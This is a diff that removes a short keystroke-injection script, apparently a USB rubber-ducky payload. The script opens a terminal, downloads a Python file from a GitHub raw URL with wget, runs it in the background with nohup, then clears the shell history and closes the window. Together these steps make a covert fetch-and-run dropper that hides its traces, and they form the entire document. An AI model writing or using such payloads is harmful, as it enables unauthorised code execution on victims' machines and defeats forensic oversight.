@@ -1,9 +1,0 @@
-CTRL-ALT t
-DELAY 800
-STRINGLN wget https://raw.githubusercontent.com/Capaseztel/Shits-I-Made-In-Class/main/payloads/test.py
-DELAY 2000
-STRINGLN nohup python3 test.py &
-DELAY 600
-STRINGLN history -c
-DELAY 600
-CTRL d
